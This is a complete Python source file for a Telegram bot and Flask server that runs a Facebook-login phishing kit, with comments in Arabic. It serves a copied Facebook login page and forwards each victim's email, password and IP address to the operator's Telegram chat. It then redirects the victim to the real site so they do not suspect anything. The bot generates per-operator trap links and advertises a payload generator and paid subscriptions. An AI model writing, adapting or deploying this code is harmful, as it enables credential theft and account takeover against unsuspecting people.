import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, render_template_string, redirect

BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = "https://daf-production-8df9.up.railway.app"

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==========================================
# قالب فيسبوك المطابق للأصل 100% (نسخة مطابقة تماماً)
# ==========================================
FB_PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; direction: rtl; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { display: flex; flex-direction: row; justify-content: space-between; max-width: 980px; width: 100%; padding: 20px; box-sizing: border-box; }
        .left-side { flex: 1; padding-right: 20px; display: flex; flex-direction: column; justify-content: center; }
        .facebook-logo { font-size: 4rem; color: #1877f2; font-weight: bold; margin-bottom: 10px; font-family: system-ui; }
        .left-side p { font-size: 28px; line-height: 32px; color: #1c1e21; margin: 0; }
        .right-side { flex: 1; display: flex; justify-content: center; align-items: center; }
        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0.1), 0 8px 16px rgba(0, 0, 0.1); width: 396px; text-align: center; }
        .login-card input { width: 90%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
        .login-card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; padding: 12px 16px; width: 95%; cursor: pointer; margin-top: 10px; }
        .login-btn:hover { background-color: #166fe5; }
        .forgot-pass { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin: 15px 0; }
        .forgot-pass:hover { text-decoration: underline; }
        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
        .create-btn:hover { background-color: #36a420; }
        @media (max-width: 768px) {
            .container { flex-direction: column; text-align: center; }
            .left-side { padding-right: 0; margin-bottom: 30px; }
            .left-side p { font-size: 20px; line-height: 24px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side">
            <div class="facebook-logo">facebook</div>
            <p>يساعدك فيسبوك على التواصل المشاركة مع الأشخاص الذين تعرفهم.</p>
        </div>
        <div class="right-side">
            <div class="login-card">
                <form method="POST">
                    <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                    <input type="password" name="pass" placeholder="كلمة السر" required>
                    <button type="submit" class="login-btn">تسجيل الدخول</button>
                    <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
                    <hr>
                    <button type="button" class="create-btn">إنشاء حساب جديد</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/login.php', methods=['GET', 'POST'])
def fb_trap():
    target_chat_id = request.args.get('id', None)
    if request.method == 'POST':
        # التقاط البيانات الحقيقية بدقة تامة من الـ Form Fields الصحيحة
        email = request.form.get('email')
        password = request.form.get('pass')
        source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        if target_chat_id:
            alert_msg = (
                "🚨 **صيد فيسبوك تم الإيقاع به بنجاح!**\n\n"
                f"👤 **البريد/الهاتف:** `{email}`\n"
                f"🔑 **كلمة السر:** `{password}`\n"
                f"🌐 **عنوان الـ IP:** `{source_ip}`"
            )
            try:
                bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
            except Exception as e:
                print(f"[-] Telegram Error: {e}")
                
        # إعادة توجيه الضحية لصفحة فيسبوك الحقيقية حتى لا يشك نهائياً
        return redirect("https://www.facebook.com", code=302)
        
    return render_template_string(FB_PHISH_TEMPLATE)

# ==========================================
# واجهة تحكم البوت
# ==========================================
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 رابط مصيدة فيسبوك الاحترافي", callback_data="gen_fb_phish"),
        InlineKeyboardButton("📦 مولد ملفات السيطرة", callback_data="gen_payload"),
        InlineKeyboardButton("📡 الجلسات النشطة", callback_data="active_sessions"),
        InlineKeyboardButton("💳 الاشتراكات", callback_data="billing")
    )
    return markup

@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    bot.send_message(message.chat.id, "⚡ **لوحة تحكم الترسانة الهجومية (النسخة الاحترافية)**:", parse_mode="Markdown", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    if call.data == "gen_fb_phish":
        bot.answer_callback_query(call.id, "جاري توليد الرابط المخفي...")
        # رابط مصيدة مطابق لشكل الروابط الطبيعية
        phish_link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        msg = (
            "🎯 **رابط مصيدة فيسبوك الاحترافي جاهز:**\n\n"
            f"`{phish_link}`\n\n"
            "الصفحة مطابقة تماماً لواجهة فيسبوك الأصلية، وعند إدخال البيانات ستصلك فوراً ويتم توجيه الضحية للموقع الحقيقي لتمويهه."
        )
        bot.send_message(chat_id, msg, parse_mode="Markdown")
        
    elif call.data == "gen_payload":
        bot.answer_callback_query(call.id, "مولد الملفات...")
        bot.send_message(chat_id, "⚙️ اختر النظام المستهدف لبناء ملف السيطرة.")
    elif call.data == "active_sessions":
        bot.answer_callback_query(call.id, "الجلسات...")
        bot.send_message(chat_id, "📡 لا توجد جلسات نشطة حالياً.")
    elif call.data == "billing":
        bot.answer_callback_query(call.id, "الاشتراكات...")
        bot.send_message(chat_id, "💳 نظام الدفع والاشتراكات مفعل.")

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    bot.infinity_polling()
